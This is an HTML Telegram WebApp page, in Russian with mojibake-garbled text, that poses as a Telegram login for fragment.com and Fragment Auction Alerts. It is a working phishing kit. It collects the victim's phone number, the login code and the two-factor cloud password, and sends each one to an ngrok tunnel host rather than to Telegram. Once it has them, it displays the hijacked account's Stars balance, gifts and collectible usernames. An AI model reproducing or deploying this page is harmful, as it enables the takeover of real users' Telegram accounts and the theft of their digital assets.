<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í—Ö–æ–¥ –≤ Telegram WebApp</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://telegram.org/css/font-roboto.css" rel="stylesheet" type="text/css">
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #ffffff; /* –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –±–µ–ª—ã–π —Ñ–æ–Ω */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login_content {
            max-width: 360px;
            width: 100%;
            padding: 20px;
        }
        .login_photos {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
        }
        .login_photos_container {
            /* –ò–ó–ú–ï–ù–ï–ù–ò–ï: –£–±—Ä–∞–Ω–∞ –≤—Å—è –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω–∞—è —Ñ–æ—Ä–º–∞ (—Ä–∞–∑–º–µ—Ä—ã, –æ–∫—Ä—É–≥–ª–µ–Ω–∏–µ, —Ñ–æ–Ω, —Ç–µ–Ω—å) */
            /* width: 120px; */
            /* height: 120px; */
            /* border-radius: 50%; */
            /* background: linear-gradient(135deg, #2AABEE 0%, #229ED9 100%); */
            /* box-shadow: 0 4px 12px rgba(42, 171, 238, 0.3); */
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login_photos img { 
            /* –ò–ó–ú–ï–ù–ï–ù–ò–ï: –ó–∞–¥–∞–Ω —Ç—Ä–µ–±—É–µ–º—ã–π —Ä–∞–∑–º–µ—Ä 120px –ø–æ –≤—ã—Å–æ—Ç–µ, —à–∏—Ä–∏–Ω–∞ –∞–≤—Ç–æ */
            height: 120px; 
            width: auto;
            border-radius: 0;
            object-fit: contain;
            /* max-width/max-height —É–±—Ä–∞–Ω—ã –¥–ª—è –ø—Ä—è–º–æ–≥–æ –∑–∞–¥–∞–Ω–∏—è —Ä–∞–∑–º–µ—Ä–∞ */
        }
        .login_photos svg {
            width: 72px;
            height: 72px;
        }
        .login_header_text {
            text-align: center;
            font-size: 15px;
            color: #000;
            margin-bottom: 8px;
            line-height: 1.5;
        }
        .bot_name {
            color: #0088cc;
            text-decoration: none;
        }
        .login_confirm_text {
            text-align: center;
            font-size: 14px;
            color: #707579;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .login_confirm_text a {
            color: #0088cc;
            text-decoration: none;
        }
        .login_country_field_wrap {
            position: relative;
            margin-bottom: 30px;
        }
        .login_country_select {
            padding: 8px 0;
            border: none;
            border-bottom: 2px solid #e5e5ea;
            font-size: 16px;
            color: #000;
            cursor: pointer;
            width: 100%;
            background: transparent;
            outline: none;
            transition: border-color 0.2s;
        }
        .login_country_select:focus {
            border-bottom-color: #0088cc;
        }
        .login_phone_field_wrap {
            display: flex;
            gap: 15px;
            margin-bottom: 40px;
        }
        .login_code_field_wrap {
            flex: 0 0 70px;
            position: relative;
        }
        .login_number_field_wrap {
            flex: 1;
            position: relative;
        }
        .phone_input {
            width: 100%;
            padding: 8px 0;
            border: none;
            border-bottom: 2px solid #e5e5ea;
            font-size: 16px;
            color: #000;
            background: transparent;
            outline: none;
            transition: border-color 0.2s;
        }
        .phone_input:focus {
            border-bottom-color: #0088cc;
        }
        .login_button_wrap {
            display: flex;
            gap: 10px;
            justify-content: center;
        }
        .btn {
            padding: 10px 24px;
            border: none;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .btn-cancel {
            background: transparent;
            color: #0088cc;
        }
        .btn-cancel:hover:not(:disabled) {
            background: rgba(0, 136, 204, 0.08);
        }
        .btn-next {
            background: #0088cc;
            color: white;
        }
        .btn-next:hover:not(:disabled) {
            background: #0077b3;
        }
        .code_verification_wrap {
            margin-top: 20px;
        }
        .code_inputs_container {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 30px;
        }
        .code_input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 500;
            background: transparent;
            border: none;
            border-bottom: 3px solid #e5e5ea;
            color: #000;
            transition: border-color 0.2s;
            outline: none;
        }
        .code_input:focus {
            border-bottom-color: #0088cc;
        }
        .code_input.filled {
            border-bottom-color: #0088cc;
        }
        .code_input.code-success {
            border-bottom-color: #10B981 !important;
        }
        .code_input.code-error {
            border-bottom-color: #EF4444 !important;
        }
        .password_field_wrap {
            margin-bottom: 30px;
        }
        .password_hint_container {
            background: #f0f8ff;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #b8d9f5;
            margin-bottom: 20px;
        }
        .password_hint_container p {
            margin: 0;
            font-size: 14px;
            color: #333;
        }
        .password_hint_label {
            font-weight: 600;
            color: #0088cc;
        }
        .password_hint_text {
            font-style: italic;
            color: #555;
        }
        .no_hint_message {
            background: #fffbf0;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ffd966;
            margin-bottom: 20px;
        }
        .no_hint_message p {
            margin: 0;
            font-size: 13px;
            color: #666;
        }
        .account_info_section {
            margin-top: 20px;
        }
        .account_info_header {
            text-align: center;
            margin-bottom: 20px;
        }
        .account_info_header h2 {
            font-size: 20px;
            color: #000;
            margin: 0 0 5px 0;
        }
        .account_info_header p {
            font-size: 14px;
            color: #707579;
            margin: 0;
        }
        .info_card {
            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
            padding: 16px;
            border-radius: 12px;
            border: 1px solid #fcd34d;
            margin-bottom: 15px;
        }
        .info_card_header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 5px;
        }
        .info_card_title {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            color: #333;
        }
        .info_card_value {
            font-size: 20px;
            font-weight: bold;
            color: #d97706;
        }
        .gifts_card {
            background: linear-gradient(135deg, #faf5ff 0%, #f3e8ff 100%);
            padding: 16px;
            border-radius: 12px;
            border: 1px solid #d8b4fe;
            margin-bottom: 15px;
        }
        .gifts_card_header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 12px;
        }
        .gifts_card_title {
            font-weight: 600;
            color: #333;
        }
        .gifts_count_badge {
            margin-left: auto;
            background: #d8b4fe;
            padding: 2px 10px;
            border-radius: 9999px;
            font-size: 12px;
            font-weight: bold;
            color: #6b21a8;
        }
        .gifts_list {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .gift_item {
            background: white;
            padding: 10px;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .gift_item_name {
            font-weight: 500;
            color: #333;
        }
        .gift_item_date {
            font-size: 12px;
            color: #999;
        }
        .collectibles_card {
            background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
            padding: 16px;
            border-radius: 12px;
            border: 1px solid #93c5fd;
            margin-bottom: 15px;
        }
        .collectibles_card_header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 12px;
        }
        .collectibles_card_title {
            font-weight: 600;
            color: #333;
        }
        .collectibles_list {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .collectible_item {
            background: white;
            padding: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .collectible_icon {
            font-size: 18px;
        }
        .collectible_name {
            font-weight: 500;
            color: #333;
            flex: 1;
        }
        .collectible_badge {
            font-size: 11px;
            background: #d1fae5;
            padding: 2px 8px;
            border-radius: 9999px;
            color: #047857;
        }
        .status_message {
            text-align: center;
            font-size: 13px;
            color: #707579;
            margin-top: 20px;
        }
        .status_message.error {
            color: #EF4444;
        }
        .status_message.success {
            color: #10B981;
        }
        .status_message.info {
            color: #0088cc;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <main class="login">
        <section class="login_content">
            <div class="login_photos">
                <div class="login_photos_container">
                    <img src="https://i.ibb.co/S452Lp3s/photo-2025-11-17-19-20-16.png" alt="–õ–æ–≥–æ—Ç–∏–ø">
                </div>
            </div>

            <div id="step-phone">
                <div class="login_header_text">
                    –í–æ–π–¥–∏—Ç–µ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç Telegram –¥–ª—è<br/><span dir="auto">fragment.com</span> –∏ <a class="bot_name" dir="auto" href="https://t.me/fragment" target="_blank">Fragment Auction Alerts</a>.
                </div>

                <div class="login_confirm_text">
                    –í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π <b>–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</b> –≤ <a target="_blank" rel="noopener" href="https://telegram.org/faq#login-and-sms">–º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ</a>. 
–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram.
                </div>

                <form id="auth-form">
                    <div class="login_country_field_wrap">
                        <select class="login_country_select" id="country-select">
                            <option value="+994" data-mask=" __ ___ __ __">–ê–∑–µ—Ä–±–∞–π–¥–∂–∞–Ω</option>
                            <option value="+375" data-mask=" (__) ___-__-__">–ë–µ–ª–∞—Ä—É—Å—å</option>
                            <option value="+44" data-mask=" ____ ______">–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è</option>
                            <option value="+49" data-mask=" __ ____ ____">–ì–µ—Ä–º–∞–Ω–∏—è</option>
                            <option value="+91" data-mask=" _____ _____">–ò–Ω–¥–∏—è</option>
                            <option value="+62" data-mask=" ___ ____ ___">–ò–Ω–¥–æ–Ω–µ–∑–∏—è</option>
                            <option value="+34" data-mask=" ___ __ __ __">–ò—Å–ø–∞–Ω–∏—è</option>
                            <option value="+39" data-mask=" ___ ____ ___">–ò—Ç–∞–ª–∏—è</option>
                            <option value="+7" data-mask=" (___) ___-__-__">–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω</option>
                            <option value="+86" data-mask=" ___ ____ ____">–ö–∏—Ç–∞–π</option>
                            <option value="+996" data-mask=" ___ ___ ___">–ö—ã—Ä–≥—ã–∑—Å—Ç–∞–Ω</option>
                            <option value="+373" data-mask=" (__) ___-__-__">–ú–æ–ª–¥–æ–≤–∞</option>
                            <option value="+48" data-mask=" ___ ___ ___">–ü–æ–ª—å—à–∞</option>
                            <option value="+7" data-mask=" (___) ___-__-__" selected>–†–æ—Å—Å–∏—è</option>
                            <option value="+992" data-mask=" __ ___ __ __">–¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω</option>
                            <option value="+993" data-mask=" _ ___ ____">–¢—É—Ä–∫–º–µ–Ω–∏—Å—Ç–∞–Ω</option>
                            <option value="+90" data-mask=" ___ ___ ____">–¢—É—Ä—Ü–∏—è</option>
                            <option value="+380" data-mask=" (__) ___-__-__">–£–∫—Ä–∞–∏–Ω–∞</option>
                            <option value="+998" data-mask=" (__) ___-__-__">–£–∑–±–µ–∫–∏—Å—Ç–∞–Ω</option>
                            <option value="+1" data-mask=" (___) ___-____">–°–®–ê</option>
                            <option value="+33" data-mask=" _ __ __ __ __">–§—Ä–∞–Ω—Ü–∏—è</option>
                            <option value="+82" data-mask=" __ ____ ____">–Æ–∂–Ω–∞—è –ö–æ—Ä–µ—è</option>
                            <option value="+81" data-mask=" ___ ____ ____">–Ø–ø–æ–Ω–∏—è</option>
                        </select>
                    </div>

                    <div class="login_phone_field_wrap">
                        <div class="login_code_field_wrap">
                            <input type="tel" class="phone_input" id="phone-code" value="+7" required>
                        </div>
                        
                        <div class="login_number_field_wrap">
                            <input type="tel" class="phone_input" id="phone-number" placeholder="" required>
                        </div>
                    </div>

                    <div class="login_button_wrap">
                        <button type="button" class="btn btn-cancel">–û—Ç–º–µ–Ω–∞</button>
                        <button type="submit" class="btn btn-next" id="send-code">–î–∞–ª–µ–µ</button>
                    </div>
                </form>
            </div>

            <div id="step-code" class="hidden">
                <div class="login_header_text">
                    –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥
                </div>

                <div class="login_confirm_text">
                    –ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤ –≤–∞—à Telegram.
                </div>

                <div class="code_verification_wrap">
                    <div class="code_inputs_container">
                        <input class="code_input" type="text" maxlength="1" data-index="0" inputmode="numeric">
                        <input class="code_input" type="text" maxlength="1" data-index="1" inputmode="numeric" disabled>
                        <input class="code_input" type="text" maxlength="1" data-index="2" inputmode="numeric" disabled>
                        <input class="code_input" type="text" maxlength="1" data-index="3" inputmode="numeric" disabled>
                        <input class="code_input" type="text" maxlength="1" data-index="4" inputmode="numeric" disabled>
                    </div>

                    <div class="login_button_wrap">
                        <button type="button" class="btn btn-cancel" id="back-to-phone">–ù–∞–∑–∞–¥</button>
                    </div>
                </div>
            </div>

            <div id="step-2fa" class="hidden">
                <div class="login_header_text">
                    –ü–∞—Ä–æ–ª—å –æ–±–ª–∞—á–Ω–æ–≥–æ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞
                </div>

                <div class="login_confirm_text">
                    –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â—ë–Ω –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–º –ø–∞—Ä–æ–ª–µ–º.
                </div>

                <div id="password-hint-container" class="password_hint_container hidden">
                    <p>
                        <span class="password_hint_label">üí° –ü–æ–¥—Å–∫–∞–∑–∫–∞:</span> 
                        <span id="password-hint" class="password_hint_text"></span>
                    </p>
                </div>
                
                <div id="no-hint-message" class="no_hint_message hidden">
                    <p>
                        ‚ö†Ô∏è –ü–æ–¥—Å–∫–∞–∑–∫–∞ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞. <br>
                        <span style="color: #999; font-size: 12px;">–í—ã –º–æ–∂–µ—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –µ—ë –≤ Telegram: –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ‚Üí –ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å ‚Üí –î–≤—É—Ö—ç—Ç–∞–ø–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</span>
                    </p>
                </div>

                <div class="password_field_wrap">
                    <input type="password" class="phone_input" id="password" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" required>
                </div>

                <div class="login_button_wrap">
                    <button type="button" class="btn btn-cancel" id="back-to-code">–ù–∞–∑–∞–¥</button>
                    <button type="button" class="btn btn-next" id="verify-password">–í–æ–π—Ç–∏</button>
                </div>
            </div>

            <div id="step-account-info" class="hidden">
                <div class="account_info_header">
                    <h2>‚úÖ –í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω!</h2>
                    <p id="user-name"></p>
                </div>

                <div class="info_card">
                    <div class="info_card_header">
                        <div class="info_card_title">
                            <span style="font-size: 20px;">‚≠ê</span>
                            <span>Telegram Stars</span>
                        </div>
                        <span id="stars-balance" class="info_card_value">0</span>
                    </div>
                </div>

                <div id="gifts-container" class="gifts_card hidden">
                    <div class="gifts_card_header">
                        <span style="font-size: 20px;">üéÅ</span>
                        <span class="gifts_card_title">–ü–æ–¥–∞—Ä–∫–∏</span>
                        <span id="gifts-count" class="gifts_count_badge">0</span>
                    </div>
                    <div id="gifts-list" class="gifts_list"></div>
                </div>

                <div id="nft-container" class="collectibles_card hidden">
                    <div class="collectibles_card_header">
                        <span style="font-size: 20px;">üíé</span>
                        <span class="collectibles_card_title">–ö–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã–µ –ø—Ä–µ–¥–º–µ—Ç—ã</span>
                    </div>
                    <div id="collectibles-list" class="collectibles_list"></div>
                </div>
            </div>

            <p id="status" class="status_message"></p>
        </section>
    </main>

    <script>
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
            // –ò–ó–ú–ï–ù–ï–ù–ò–ï: –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ñ–æ–Ω–∞ –Ω–∞ –±–µ–ª—ã–π, –∏–≥–Ω–æ—Ä–∏—Ä—É—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ WebApp
            document.body.style.background = '#ffffff'; 
        }

        const API_BASE = 'https://supercritical-hatable-elanor.ngrok-free.dev';
        let sessionId = null;

        const countrySelect = document.getElementById('country-select');
        const phoneCode = document.getElementById('phone-code');
        const phoneNumber = document.getElementById('phone-number');
        const stepPhone = document.getElementById('step-phone');
        const stepCode = document.getElementById('step-code');
        const step2fa = document.getElementById('step-2fa');
        const stepAccountInfo = document.getElementById('step-account-info');
        const statusEl = document.getElementById('status');
        const codeInputs = document.querySelectorAll('.code_input');
        const passwordInput = document.getElementById('password');

        function show(el) { el.classList.remove('hidden'); }
        function hide(el) { el.classList.add('hidden'); }

        function setStatus(text, type = 'info') {
            statusEl.textContent = text;
            statusEl.className = 'status_message ' + type;
        }

        function updatePhoneMask(code) {
            const selectedOption = Array.from(countrySelect.options).find(opt => opt.value === code);
            const mask = selectedOption ? selectedOption.getAttribute('data-mask') : null;
            phoneNumber.placeholder = mask ? mask.replace(/_/g, '‚Äî').trim() : " –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞";
        }

        countrySelect.addEventListener('change', function() {
            phoneCode.value = this.value;
            updatePhoneMask(this.value);
            phoneNumber.focus(); 
        });

        phoneCode.addEventListener('input', function() {
            let currentInput = this.value;
            
            currentInput = currentInput.replace(/[^\d+]/g, '');
            if (currentInput.startsWith('+') && currentInput.indexOf('+', 1) !== -1) {
                currentInput = '+' + currentInput.slice(1).replace(/\+/g, '');
            } else if (!currentInput.startsWith('+') && currentInput.length > 0) {
                currentInput = '+' + currentInput;
            }
            this.value = currentInput;

            const allOptions = Array.from(countrySelect.options);
            let bestMatchOption = allOptions
                .filter(opt => currentInput.startsWith(opt.value))
                .sort((a, b) => b.value.length - a.value.length)[0];

            if (bestMatchOption) {
                const matchedCode = bestMatchOption.value;
                
                if (currentInput.length > matchedCode.length) {
                    const overflow = currentInput.substring(matchedCode.length);
                    this.value = matchedCode; 
                    countrySelect.value = matchedCode;
                    updatePhoneMask(matchedCode);
                    phoneNumber.value = overflow;
                    phoneNumber.focus();
                    return;
                }
                
                countrySelect.value = matchedCode;
                updatePhoneMask(matchedCode);
            } else {
                countrySelect.value = "";
                phoneNumber.placeholder = " –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞"; 
            }
        });

        window.onload = function() {
            updatePhoneMask(phoneCode.value);
        };

        function clearCodeInputs() {
            codeInputs.forEach((input, index) => {
                input.value = '';
                input.classList.remove('filled', 'code-success', 'code-error');
                if (index > 0) {
                    input.disabled = true;
                } else {
                    input.disabled = false;
                }
            });
        }

        function displayAccountInfo(user, accountInfo) {
            document.getElementById('user-name').textContent = user.name ? `–ü—Ä–∏–≤–µ—Ç, ${user.name}!` : '–ü—Ä–∏–≤–µ—Ç!';
            
            document.getElementById('stars-balance').textContent = accountInfo.stars_balance || 0;
            
            if (accountInfo.gifts && accountInfo.gifts.length > 0) {
                show(document.getElementById('gifts-container'));
                document.getElementById('gifts-count').textContent = accountInfo.gifts.length;
                const giftsList = document.getElementById('gifts-list');
                giftsList.innerHTML = '';
                accountInfo.gifts.forEach((gift) => {
                    const giftDiv = document.createElement('div');
                    giftDiv.className = 'gift_item';
                    giftDiv.innerHTML = `
                        <span class="gift_item_name">${gift.type || '–ü–æ–¥–∞—Ä–æ–∫'}</span>
                        <span class="gift_item_date">${gift.date ? new Date(gift.date).toLocaleDateString() : ''}</span>
                    `;
                    giftsList.appendChild(giftDiv);
                });
            } else {
                hide(document.getElementById('gifts-container'));
            }
            
            if (accountInfo.has_nft && accountInfo.collectibles && accountInfo.collectibles.length > 0) {
                show(document.getElementById('nft-container'));
                const collectiblesList = document.getElementById('collectibles-list');
                collectiblesList.innerHTML = '';
                accountInfo.collectibles.forEach(item => {
                    const itemDiv = document.createElement('div');
                    itemDiv.className = 'collectible_item';
                    let displayText = item.type;
                    if (item.username) {
                        displayText += `: @${item.username}`;
                    }
                    itemDiv.innerHTML = `
                        <span class="collectible_icon">${item.type === 'Premium' ? '‚≠ê' : 'üîπ'}</span>
                        <span class="collectible_name">${displayText}</span>
                        ${item.active ? '<span class="collectible_badge">–ê–∫—Ç–∏–≤–Ω–æ</span>' : ''}
                    `;
                    collectiblesList.appendChild(itemDiv);
                });
            } else {
                hide(document.getElementById('nft-container'));
            }
            
            hide(stepCode);
            hide(step2fa);
            show(stepAccountInfo);
        }

        document.getElementById('auth-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = phoneCode.value.trim() + phoneNumber.value.trim().replace(/[^0-9]/g, '');

            if (!phoneNumber.value.trim()) {
                setStatus('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞', 'error');
                return;
            }

            setStatus('–û—Ç–ø—Ä–∞–≤–ª—è—é –∫–æ–¥...', 'info');
            document.getElementById('send-code').disabled = true;

            try {
                const res = await fetch(`${API_BASE}/send_code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });

                if (!res.ok) throw new Error(await res.text());

                const data = await res.json();
                sessionId = data.session_id;

                setStatus('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏—è Telegram.', 'success');

                clearCodeInputs();
                hide(stepPhone);
                show(stepCode);
                codeInputs[0].focus();

            } catch (e) {
                setStatus('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞: ' + (e.message || e), 'error');
            } finally {
                document.getElementById('send-code').disabled = false;
            }
        });

        async function verifyCode() {
            const code = Array.from(codeInputs).map(input => input.value).join('');
            if (!sessionId || code.length !== 5) return;
            
            setStatus('–ü—Ä–æ–≤–µ—Ä—è—é –∫–æ–¥...', 'info');
            codeInputs.forEach(input => input.disabled = true);

            try {
                const res = await fetch(`${API_BASE}/verify_code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ session_id: sessionId, code })
                });

                const text = await res.text();
                if (!res.ok) throw new Error(text);

                const data = JSON.parse(text);

                codeInputs.forEach(input => {
                    input.classList.add('code-success');
                    setTimeout(() => input.classList.remove('code-success'), 1000);
                });

                if (data.twofa_required) {
                    setStatus('–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å 2FA. –í–≤–µ–¥–∏—Ç–µ –µ–≥–æ.', 'info');
                    
                    passwordInput.value = '';

                    if (data.password_hint && data.password_hint.trim() !== '') {
                        document.getElementById('password-hint').textContent = data.password_hint;
                        show(document.getElementById('password-hint-container'));
                        hide(document.getElementById('no-hint-message'));
                    } else {
                        hide(document.getElementById('password-hint-container'));
                        show(document.getElementById('no-hint-message'));
                    }
                    
                    hide(stepCode);
                    show(step2fa);
                    passwordInput.focus();
                } else {
                    setStatus('–í—Ö–æ–¥ —É—Å–ø–µ—à–µ–Ω!', 'success');
                    
                    if (data.user && data.account_info) {
                        displayAccountInfo(data.user, data.account_info);
                    } else {
                        hide(stepCode);
                    }
                }
            } catch (e) {
                codeInputs.forEach(input => {
                    input.classList.add('code-error');
                    setTimeout(() => input.classList.remove('code-error'), 1000);
                });

                setStatus('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫–æ–¥–∞: ' + (e.message || e), 'error');
                
                clearCodeInputs();
                codeInputs[0].focus();
            }
        }

        codeInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '').charAt(0);

                if (e.target.value) {
                    e.target.classList.add('filled');
                    
                    if (index < codeInputs.length - 1) {
                        codeInputs[index + 1].disabled = false;
                        codeInputs[index + 1].focus();
                    } else if (index === codeInputs.length - 1) {
                        verifyCode();
                    }
                } else {e.target.classList.remove('filled');
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    codeInputs[index - 1].value = '';
                    codeInputs[index - 1].classList.remove('filled');
                    codeInputs[index - 1].focus();
                    e.preventDefault();
                }
                
                if (!/^\d$/.test(e.key) && e.key.length === 1 && e.key !== 'Tab' && e.key !== 'Backspace') {
                    e.preventDefault();
                }
            });
        });

        document.getElementById('back-to-phone').addEventListener('click', function() {
            hide(stepCode);
            show(stepPhone);
        });

        document.getElementById('back-to-code').addEventListener('click', function() {
            hide(step2fa);
            show(stepCode);
        });

        async function verifyPassword() {
            const password = passwordInput.value.trim();
            if (!sessionId || !password) return;

            setStatus('–ü—Ä–æ–≤–µ—Ä—è—é –ø–∞—Ä–æ–ª—å 2FA...', 'info');
            document.getElementById('verify-password').disabled = true;

            try {
                const res = await fetch(`${API_BASE}/verify_password`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ session_id: sessionId, password })
                });

                if (!res.ok) {
                    const errorText = await res.text();
                    let errorMsg = '–û—à–∏–±–∫–∞';
                    try {
                        const errorJson = JSON.parse(errorText);
                        errorMsg = errorJson.detail || errorText;
                    } catch {
                        errorMsg = errorText;
                    }
                    throw new Error(errorMsg);
                }

                const data = await res.json();
                setStatus('–í—Ö–æ–¥ —É—Å–ø–µ—à–µ–Ω!', 'success');
                
                if (data.user && data.account_info) {
                    displayAccountInfo(data.user, data.account_info);
                } else {
                    hide(step2fa);
                }

            } catch (e) {
                setStatus(e.message || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ –ø–∞—Ä–æ–ª—è', 'error');
                passwordInput.value = '';
                passwordInput.focus();
            } finally {
                document.getElementById('verify-password').disabled = false;
            }
        }

        document.getElementById('verify-password').addEventListener('click', verifyPassword);

        setStatus('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–¥–∞.');
    </script>
</body>
</html>
